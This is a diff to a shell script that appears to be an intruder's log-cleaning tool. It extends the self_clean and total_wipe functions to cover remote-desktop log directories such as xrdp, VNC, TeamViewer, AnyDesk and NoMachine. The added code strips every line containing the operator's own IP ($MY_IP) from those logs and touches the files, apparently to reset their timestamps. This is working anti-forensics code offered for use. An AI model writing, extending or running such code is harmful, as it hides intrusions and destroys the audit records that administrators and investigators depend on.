@@ -130,6 +130,21 @@ get_log_search_dirs() {
 /var/log/hbase
 /var/log/hadoop
 /var/log/zookeeper
+/var/log/xrdp
+/var/log/xrdp-sesman
+/var/log/vnc
+/var/log/vncserver
+/var/log/tigervnc
+/var/log/tightvnc
+/var/log/spice
+/var/log/spice-vdagent
+/var/log/nx
+/var/log/nomachine
+/var/log/teamviewer
+/var/log/anydesk
+/var/log/remmina
+/var/log/gnome-remote-desktop
+/var/log/chrome-remote-desktop
 /var/log/dnsmasq
 /var/log/unbound
 /var/log/named
@@ -412,6 +427,20 @@ self_clean() {
         done
         info "Proxy logs cleaned"
 
+        # Remote Desktop logs (RDP/VNC/SPICE/NoMachine/TeamViewer/AnyDesk)
+        for dir in /var/log/xrdp /var/log/xrdp-sesman /var/log/vnc /var/log/vncserver \
+                   /var/log/tigervnc /var/log/tightvnc /var/log/spice \
+                   /var/log/spice-vdagent /var/log/nx /var/log/nomachine \
+                   /var/log/teamviewer /var/log/anydesk /var/log/remmina \
+                   /var/log/gnome-remote-desktop /var/log/chrome-remote-desktop; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        [ -f /var/log/xrdp.log ] && remove_ip_lines /var/log/xrdp.log "$MY_IP"
+        [ -f /var/log/vnc.log ] && remove_ip_lines /var/log/vnc.log "$MY_IP"
+        info "Remote desktop logs cleaned"
+
         # DHCP lease logs
         for dir in /var/log/dhcp /var/log/dhcpd; do
             if [ -d "$dir" ]; then
@@ -631,7 +660,9 @@ total_wipe() {
                /var/log/neo4j /var/log/couchdb /var/opt/mssql/log \
                /var/log/dnsmasq /var/log/unbound /var/log/named /var/log/squid \
                /var/log/haproxy /var/log/dhcp /var/log/radius /var/log/freeradius \
-               /var/log/samba /var/log/crash /var/log/abrt /var/log/gdm /var/log/lightdm; do
+               /var/log/samba /var/log/crash /var/log/abrt /var/log/gdm /var/log/lightdm \
+               /var/log/xrdp /var/log/vnc /var/log/spice /var/log/nx /var/log/nomachine \
+               /var/log/teamviewer /var/log/anydesk /var/log/gnome-remote-desktop; do
         if [ -d "$dir" ]; then
             find "$dir" -type f -exec $touch_cmd {} \; 2>/dev/null || true
         fi
